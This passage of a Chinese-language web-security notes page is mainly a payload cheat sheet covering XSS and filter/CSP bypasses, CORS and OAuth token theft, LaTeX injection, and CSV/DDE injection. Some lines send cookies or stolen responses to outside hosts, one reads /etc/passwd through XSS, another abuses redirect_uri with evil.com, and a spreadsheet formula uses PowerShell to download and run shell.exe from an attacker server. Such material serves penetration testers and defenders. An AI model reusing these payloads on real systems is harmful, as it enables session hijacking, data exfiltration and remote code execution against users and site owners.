class="string">''</span>+&#123;&#125;)[<span class="number">1</span>]+(!<span class="number">0</span>+<span class="string">''</span>)[<span class="number">1</span>]](((!<span class="number">1</span>+<span class="string">""</span>)[<span class="number">1</span>]+(!<span class="number">1</span>+<span class="string">""</span>)[<span class="number">2</span>]+(!<span class="number">0</span>+<span class="string">""</span>)[<span class="number">3</span>]+(!<span class="number">0</span>+<span class="string">""</span>)[<span class="number">1</span>]+(!<span class="number">0</span>+<span class="string">""</span>)[<span class="number">0</span>])+<span class="string">"(1)"</span>)()</span><br><span class="line"></span><br><span class="line">([,ウ,,,,ア]=[]+&#123;&#125;,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+<span class="string">'(-~ウ)'</span>)()</span><br><span class="line"></span><br><span class="line">更多神奇编码alert：http:<span class="comment">//aem1k.com/aurebesh.js/#</span></span><br><span class="line"></span><br><span class="line">x@x.com&lt;--<span class="string">`&lt;img/src=`</span> onerror=alert(<span class="number">1</span>)&gt; --!&gt;</span><br><span class="line">&lt;noscript&gt;<span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">"&lt;/noscript&gt;</span></span></span><span class="xml"><span class="tag"><span class="string">&lt;img src=x onerror=alert(1)&gt;"</span>&gt;</span></span></span><br><span class="line">&lt;body onpageshow=a='a'+'lert',window[a](1)&gt;</span><br><span class="line"></span><br><span class="line">6666666"&gt; &lt;video hidden="hidden" onloadedmetadata="\u006aava\u0073cript:[1].find(\u0061lert)" src="http://www.runoob.com/try/demo_source/movie.mp4" &gt;&lt;/video&gt;</span><br><span class="line">&lt;details open ontoggle=$.getScript`//127.0.0.1:899/a.js`&gt;</span><br><span class="line">&lt;details/open/ontoggle=alert`1`&gt;</span><br><span class="line">&lt;marquee onstart=alert(1)&gt;</span><br><span class="line">&lt;img src=x onerror=\u0061lert``&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onload="(new Image()).src='//baidu.com?+document.cookie'"&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=a="%2",location="javascr"+"ipt:aler"+"t"+a+"81"+a+"9"&gt;</span><br><span class="line">&lt;img src=1 onerror="javascript:window.onerror=alert;throw 1"&gt;</span><br><span class="line">&lt;img src=1 onerror=_=top;_.onerror=_["al"+"ert"];throw[2333] &gt;</span><br><span class="line"></span><br><span class="line">fcr1y" onmouseover=a="%2",location="javascr"+"ipt:aler"+"t"+a+"81"+a+"9" "lrtmk</span><br><span class="line"></span><br><span class="line">&lt;p id="wow" onfocus="alert(1)" contenteditable=""&gt;&lt;/p&gt;               use tag #wow</span><br><span class="line">&lt;p style="animation-name:progress-bar-stripes" onanimationstart="alert(1)"&gt;&lt;/p&gt; 在bootstrap引用</span><br><span class="line">&lt;div onpointerenter="alert(1)"&gt;11111 &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">将"/"转义为"&amp;sol;"（URLEncode后是%26sol;）</span><br><span class="line">双重url编码</span><br><span class="line"></span><br><span class="line">"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt;</span><br><span class="line">javascript:"/*\"/*`/*' /*&lt;/template&gt;&lt;/textarea&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/style&gt;&lt;/script&gt;--&gt;&amp;lt;svg onload=/*&lt;html/*/onmouseover=alert()//&gt;</span><br><span class="line"># 多语言xss检测</span><br></pre></td></tr></table></figure><blockquote><p>更详细的bypass：<a href="https://medium.com/@man.shum546/xss-payload-2018-5271c5e3bbce" target="_blank" rel="noopener">https://medium.com/@man.shum546/xss-payload-2018-5271c5e3bbce</a></p></blockquote><h3 id="各种技巧"><a href="#各种技巧" class="headerlink" title="各种技巧"></a>各种技巧</h3><p><strong>style xss</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">style animation引申</span><br><span class="line">寻找css中使用animation的方法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如bootstrap中的</span><br><span class="line">- spinner-grow</span><br><span class="line">- spinner-border</span><br><span class="line">- progress-bar-stripes</span><br><span class="line"></span><br><span class="line">animation事件</span><br><span class="line">- animationcancel</span><br><span class="line">- onanimationstart</span><br><span class="line">- onanimationend</span><br><span class="line">- animationiteration</span><br><span class="line"></span><br><span class="line">&lt;p style=<span class="string">"animation-name:spinner-grow"</span> onanimationend=<span class="string">"alert(1)"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><blockquote><p>参考：<a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement</a></p></blockquote><p><strong>mxss</strong><br><code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;</code></p><blockquote><p>详细：<a href="https://research.securitum.com/dompurify-bypass-using-mxss/" target="_blank" rel="noopener">https://research.securitum.com/dompurify-bypass-using-mxss/</a></p></blockquote><p><strong>绕jsonp</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">getdata</span>(<span class="params">data</span>)</span>&#123;alert(<span class="built_in">JSON</span>.stringify(data));&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/xxxx.com/</span>?callback=getdata<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=?url=alert(<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>bypass xss auditor</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</span><br></pre></td></tr></table></figure><p><strong>瞄点xss</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;alert(1)&quot;&gt;</span><br><span class="line">id=&apos;a&apos; contenteditable onfocus=&quot;alert(1)&quot;#a</span><br></pre></td></tr></table></figure></p><blockquote><p><a href="https://html5sec.org/#145" target="_blank" rel="noopener">https://html5sec.org/#145</a><br><a href="https://github.com/cure53/XSSChallengeWiki/wiki/Mini-Puzzle-1-on-kcal.pw" target="_blank" rel="noopener">https://github.com/cure53/XSSChallengeWiki/wiki/Mini-Puzzle-1-on-kcal.pw</a></p></blockquote><p><strong>开启页面缓存  Pragma: cache<br>ie 11 对于强制json xss的bypass</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">低版本ie 不会的referer进行url编码</span><br><span class="line"></span><br><span class="line">----会传送referer</span><br><span class="line">https-&gt;https</span><br><span class="line">http-&gt;https</span><br><span class="line">http-&gt;http</span><br><span class="line">----不会传送refer</span><br><span class="line">https-&gt;http</span><br></pre></td></tr></table></figure></p><blockquote><p><a href="http://www.qingpingshan.com/jb/javascript/184536.html" target="_blank" rel="noopener">http://www.qingpingshan.com/jb/javascript/184536.html</a></p></blockquote><p><strong>针对hidden 的xss</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">分为漏洞处在hidden前或后</span><br><span class="line">前：</span><br><span class="line">    可以覆盖type为其他的，`&lt;input value=&quot;a&quot; src=1 onerror=alert(1) type=&quot;image&quot; type=&quot;hidden&quot;&gt;`</span><br><span class="line">后：</span><br><span class="line">只能通过间接的方式来触发，比如大家熟知的`&apos;&lt;input type=&quot;hidden&quot; name=&quot;returnurl&quot; value=&quot;&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; /&gt;`，然后按shift+alt+x触发xss，但是还可以这样操作，无交互的触发xss，相比起来已经是无限制了，` style=&apos;behavior:url(?)&apos;onreadystatechange=&apos;alert(1)&apos; `</span><br><span class="line">&gt; https://blog.csdn.net/u014345860/article/details/77351760</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/07/5cd0d9e3ea31f.png" alt="20190429164404-f17af52a-6a5a-1.png"></p><p>[+]location<br><img src="https://i.loli.net/2019/04/24/5cbfdb9fc1fef.jpg" alt="p.jpg"><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=location=<span class="string">"javascript:alert%281%29"</span>&gt;</span><br><span class="line">&lt;img src=x onerror=location=<span class="string">"javascr"</span>+<span class="string">"ipt:al"</span>+<span class="string">"ert%28docu"</span>+<span class="string">"ment.co"</span>+<span class="string">"okie%29"</span>&gt;</span><br><span class="line">&lt;img src=x onerror=Function(location.hash.slice(1))()&gt;#alert(1)</span><br></pre></td></tr></table></figure></p><p>详细：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html</a></p></blockquote><p>[+]//和<code>\\</code>绕过</p><p>但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以<code>\\</code>在Windows下是file协议，在linux下才会是当前域的协议</p><p>//test.com/1.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unescape</span>(<span class="string">'%2f%2ftest.com%2f1.js'</span>)</span><br></pre></td></tr></table></figure></p><p>[+]Ascii码绕过</p><p><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</code></p><p>[+]过滤括号</p><p><code>&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code></p><p>[+] 编码绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#html</span><br><span class="line">%<span class="number">26</span>%<span class="number">2397</span>;lert(<span class="number">1</span>)</span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="string">"&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;"</span> /&gt;</span><br><span class="line">&lt;iframe src=<span class="string">"javascript:%61%6c%65%72%74%28%31%29"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">#UTF-16be</span><br><span class="line">%<span class="number">00</span>%<span class="number">3</span>C%<span class="number">00</span>s%<span class="number">00</span>v%<span class="number">00</span>g%<span class="number">00</span>/%<span class="number">00</span>o%<span class="number">00</span>n%<span class="number">00</span>l%<span class="number">00</span>o%<span class="number">00</span>a%<span class="number">00</span>d%<span class="number">00</span>=%<span class="number">00</span>a%<span class="number">00</span>l%<span class="number">00</span>e%<span class="number">00</span>r%<span class="number">00</span>t%<span class="number">00</span>(%<span class="number">00</span>)%<span class="number">00</span>%<span class="number">3</span>E%<span class="number">00</span></span><br><span class="line">#UTF-8</span><br><span class="line">&lt; = %C0%BC = %E0%<span class="number">80</span>%BC = %F0%<span class="number">80</span>%<span class="number">80</span>%BC</span><br><span class="line">&gt; = %C0%BE = %E0%<span class="number">80</span>%BE = %F0%<span class="number">80</span>%<span class="number">80</span>%BE</span><br><span class="line"><span class="string">' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7</span></span><br><span class="line"><span class="string">" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2</span></span><br><span class="line"><span class="string">" = %CA%BA</span></span><br><span class="line"><span class="string">'</span> = %CA%B9</span><br><span class="line">#Unicode</span><br><span class="line">%EF%BC%<span class="number">9</span>E becomes &gt;</span><br><span class="line">%EF%BC%<span class="number">9</span>C becomes &lt;</span><br></pre></td></tr></table></figure><p>[+] csp bypass</p><p>CSP Bypass</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Check the CSP on https:<span class="comment">//csp-evaluator.withgoogle.com and the post : How to use Google’s CSP Evaluator to bypass CSP</span></span><br><span class="line">Bypass CSP using JSONP <span class="keyword">from</span> Google (Trick by @apfeifer27)</span><br><span class="line"></span><br><span class="line"><span class="comment">//google.com/complete/search?client=chrome&amp;jsonp=alert(1);</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=<span class="comment">//google.com/complete/search?client=chrome%26jsonp=alert(1);&gt;"</span></span><br><span class="line"></span><br><span class="line">More JSONP endpoints available <span class="keyword">in</span> /Intruders/jsonp_endpoint.txt</span><br><span class="line">Bypass CSP by lab.wallarm.com</span><br><span class="line"></span><br><span class="line">Works <span class="keyword">for</span> CSP like Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span> <span class="string">'unsafe-inline'</span>;, POC here</span><br><span class="line"></span><br><span class="line">script=<span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.src=<span class="string">'//bo0om.ru/csp.js'</span>;</span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>].document.head.appendChild(script);</span><br><span class="line"></span><br><span class="line">Bypass CSP by Rhynorater</span><br><span class="line"></span><br><span class="line">d=<span class="built_in">document</span>;f=d.createElement(<span class="string">"iframe"</span>);f.src=d.querySelector(<span class="string">'link[href*=".css"]'</span>).href;d.body.append(f);s=d.createElement(<span class="string">"script"</span>);s.src=<span class="string">"https://yoursubdomain.xss.ht"</span>;setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;f.contentWindow.document.head.append(s);&#125;,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">Bypass CSP by @akita_zen</span><br><span class="line"></span><br><span class="line">Works <span class="keyword">for</span> CSP like script-src self</span><br><span class="line"></span><br><span class="line">&lt;object data=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">Bypass CSP by @<span class="number">404</span>death</span><br><span class="line"></span><br><span class="line">Works <span class="keyword">for</span> CSP like script-src <span class="string">'self'</span> data:</span><br><span class="line"></span><br><span class="line">&lt;script ?<span class="regexp">/src="data:+,\u0061lert%281%29"&gt;/</span><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="xss-in-markdown-SVG-XML-files"><a href="#xss-in-markdown-SVG-XML-files" class="headerlink" title="xss in markdown/SVG/XML/files"></a>xss in markdown/SVG/XML/files</h3><p>markdown<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[a](javascript:prompt(<span class="built_in">document</span>.cookie))</span><br><span class="line">[a](j a v a s c r i p t:prompt(<span class="built_in">document</span>.cookie))</span><br><span class="line">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span><br><span class="line">[a](javascript:<span class="built_in">window</span>.onerror=alert;<span class="keyword">throw</span>%<span class="number">201</span>)</span><br></pre></td></tr></table></figure></p><p>svg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(document.domain)&quot;/&gt;</span><br><span class="line">&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;</span><br><span class="line">&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;</span><br><span class="line">&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><h3 id="self-xss的利用"><a href="#self-xss的利用" class="headerlink" title="self-xss的利用"></a>self-xss的利用</h3><blockquote><p><a href="http://www.anquan.us/static/drops/web-14035.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/web-14035.html</a></p></blockquote><h3 id="ctf中常见xss读文件"><a href="#ctf中常见xss读文件" class="headerlink" title="ctf中常见xss读文件"></a>ctf中常见xss读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://xxxxx/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///etc/passwd&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="CORS学习"><a href="#CORS学习" class="headerlink" title="CORS学习"></a>CORS学习</h2><p>bypass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Origin: null</span><br><span class="line">unicode攻击</span><br></pre></td></tr></table></figure></p><p>一般来说存在如下头，表示存在cors漏洞<br><code>Access-Control-Allow-Origin: *</code><br><code>Access-Control-Allow-Credentials: true</code></p><p>在Credentials为false的情况下，使用浏览器缓存绕过<br><code>Access-Control-Allow-Origin: *</code><br><code>Access-Control-Allow-Credentials: false</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;  </span><br><span class="line">var url = &quot;https://api.a.com/x/wd?c=web&quot;;  </span><br><span class="line">fetch(url, &#123;    </span><br><span class="line">    method: &apos;GET&apos;,    </span><br><span class="line">    cache: &apos;force-cache&apos;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>强烈推荐：</p><blockquote><p><a href="https://xz.aliyun.com/t/2745" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745</a><br><a href="https://github.com/amandakelake/blog/issues/62" target="_blank" rel="noopener">https://github.com/amandakelake/blog/issues/62</a><br>结合例子：<br><a href="https://www.freebuf.com/articles/web/158529.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/158529.html</a></p></blockquote><p>实战过程遇到的例子<br>给出验证poc<br>受害者先登录漏洞网站，攻击者诱导受害者运行下列代码/(通过配合xss  或  直接放自己服务器上让受害者访问网页)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;  </span><br><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.onload = reqListener;</span><br><span class="line"><span class="keyword">var</span> sendData = &#123;<span class="string">"query"</span>:<span class="string">"query handleGetPersonalAssets &#123;\n  getPersonalAssets &#123;\n    phone\n    redAvailable\n    totalTickets\n    __typename\n  &#125;\n&#125;\n"</span>&#125;;</span><br><span class="line">req.open(<span class="string">"POST"</span>,<span class="string">"https://漏洞网站/api"</span>,<span class="literal">true</span>);</span><br><span class="line">req.setRequestHeader(<span class="string">'content-type'</span>, <span class="string">'application/json'</span>);</span><br><span class="line">req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">req.send(<span class="built_in">JSON</span>.stringify(sendData));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">location=<span class="string">"http://自己服务器地址/?////////////="</span>+<span class="keyword">this</span>.responseText;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>防御方式</p><blockquote><p><a href="https://blog.csdn.net/weixin_41646716/article/details/85070981" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41646716/article/details/85070981</a></p></blockquote><h2 id="sockets-攻击"><a href="#sockets-攻击" class="headerlink" title="sockets 攻击"></a>sockets 攻击</h2><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/Files/ws-harness.py" target="_blank" rel="noopener"> tool </a></p><p>默认本地监听8000端口<br><code>python ws-harness.py -u &quot;ws://dvws.local:8080/authenticate-user&quot; -m ./message.txt</code><br>message.txt填入模板,需要fuzz的地方使用<strong>[FUZZ]</strong>关键词<br><code>{&quot;auth_user&quot;:&quot;dGVzda==&quot;, &quot;auth_pass&quot;:&quot;[FUZZ]&quot;}</code><br>和sqlmap联动<br><code>sqlmap -u http://127.0.0.1:8000/?fuzz=test</code></p><h2 id="SSO-单点登录"><a href="#SSO-单点登录" class="headerlink" title="SSO 单点登录"></a>SSO 单点登录</h2><h3 id="SAML-注入"><a href="#SAML-注入" class="headerlink" title="SAML 注入"></a>SAML 注入</h3><p>待续…….</p><h2 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h2><p>bypass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unicode攻击</span><br><span class="line">@欺骗</span><br><span class="line">\/</span><br></pre></td></tr></table></figure></p><p>重定向到恶意地址来获取sso的token<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/signin/authorize?[...]&amp;redirect_uri=https://localhost.evil.com</span><br></pre></td></tr></table></figure></p><p>重定向支持解析html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com/signin/authorize?[...]&amp;redirect_uri=&lt;img src=1 onerror=alert()&gt;</span><br></pre></td></tr></table></figure></p><p>apk或ios应用反编译中包含OAuth私钥</p><p>思路扩展：</p><ol><li>client_id与redirect_uri绑定将不存在此漏洞（以腾讯为例client_id=1002723021为  xxx.com域名的服务id，此时遍历redirect_uri确定允许范围，一般为二级或三级域）</li></ol><p>2.1 假设存在二级域的文件上传（由于是oss，不能上传webshell，只能上传html页面，在html页面写入重定向到自己服务器，自己服务器上能接收到referer信息，其中就能包含oauth token</p><p>2.2 Discuz 发帖在图片地址栏填入我们的恶意服务器，用来接收受害者code</p><blockquote><p>参考: <a href="https://zhuanlan.zhihu.com/p/34252979" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34252979</a></p></blockquote><h2 id="LaTeX-注入"><a href="#LaTeX-注入" class="headerlink" title="LaTeX 注入"></a>LaTeX 注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\input&#123;/etc/passwd&#125;          #读文件</span><br><span class="line">\include&#123;password&#125; </span><br><span class="line"></span><br><span class="line">\newwrite\outfile             #写文件</span><br><span class="line">\openout\outfile=cmd.tex</span><br><span class="line">\write\outfile&#123;Hello-world&#125;</span><br><span class="line">\closeout\outfile</span><br><span class="line"></span><br><span class="line">\immediate\write18&#123;env &gt; output&#125; #命令执行</span><br><span class="line">\input&#123;output&#125;</span><br><span class="line"></span><br><span class="line">\url&#123;javascript:alert(1)&#125;      #跨站脚本</span><br></pre></td></tr></table></figure><h2 id="csv-注入"><a href="#csv-注入" class="headerlink" title="csv 注入"></a>csv 注入</h2><p>examples:<br><code>UserId,BillToDate,ProjectName,Description,DurationMinutes1,2017-07-25,Test Project,Flipped the jibbet,602,2017-07-25,Important Client,&quot;Bop, dop, and giglip&quot;, 2402,2017-07-25,Important Client,&quot;=2+5&quot;, 240</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pop a calc</span></span><br><span class="line">DDE (<span class="string">"cmd"</span>;<span class="string">"/C calc"</span>;<span class="string">"!A0"</span>)A0</span><br><span class="line">@SUM(1+1)*cmd|<span class="string">' /C calc'</span>!A0</span><br><span class="line">=2+5+cmd|<span class="string">' /C calc'</span>!A0</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop a notepad</span></span><br><span class="line">=cmd|<span class="string">' /C notepad'</span>!<span class="string">'A1'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># powershell download and execute</span></span><br><span class="line">=cmd|<span class="string">'/C powershell IEX(wget attacker_server/shell.exe)'</span>!A0</span><br><span class="line"></span><br><span class="line"><span class="comment"># msf smb delivery with rundll32</span></span><br><span class="line">=cmd|<span class="string">'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'</span>!_xlbgnm.A1</span><br></pre></td></tr></table></figure><h2 id="no-sql"><a href="#no-sql" class="headerlink" title="no sql"></a>no sql</h2><p>待补充……</p><p>工具:<a href="https://github.com/codingo/NoSQLMap" target="_blank" rel="noopener">https://github.com/codingo/NoSQLMap</a></p><p>认证绕过，使用$ne和$gt<br><figure class="highlight"><table><tr><td class="gutter"><pre><span 